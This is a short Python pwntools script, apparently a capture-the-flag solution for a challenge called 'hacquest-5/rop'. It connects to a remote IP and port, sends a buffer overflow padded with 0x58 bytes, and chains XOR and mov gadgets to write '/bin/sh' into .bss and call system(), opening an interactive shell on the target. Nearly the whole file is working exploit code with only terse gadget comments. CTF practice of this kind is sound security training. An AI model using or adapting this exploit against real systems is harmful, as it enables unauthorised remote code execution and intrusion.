from pwn import *

#r = process("./hacquest-5/rop") # 135.181.101.92
r = remote("13.126.29.6", 8015)
context.arch = "amd64"

pop_rdi = 0x4012b3
pop_r12 = 0x4011e3
xor_r10r10 = 0x4011ea
xor_r11r11 = 0x4011e6
xor_r10r12 = 0x4011ee
xor_r11r10 = 0x4011f2
mov_r11r10 = 0x4011f6
system = 0x401060
bss = 0x404500

ropchain = b"a"*0x58
ropchain += flat([
    xor_r11r11, #zero out r11
    xor_r10r10, #zero out r10
    pop_r12, #r12 -> bss
    bss,
    xor_r10r12, #mov r10, r12
    xor_r11r10, #mov r11, r10 (r11 -> bss)
    pop_r12, #r12 -> /bin/sh
    "/bin/sh\x00",
    xor_r10r10, #zero out r10
    xor_r10r12, #mov r10, r12
    mov_r11r10, #mov qword[r11], r10 (write /bin/sh to bss)
    pop_rdi, #rdi -> /bin/sh
    bss,
    system
])

r.sendlineafter("words!\n",ropchain)
r.interactive()
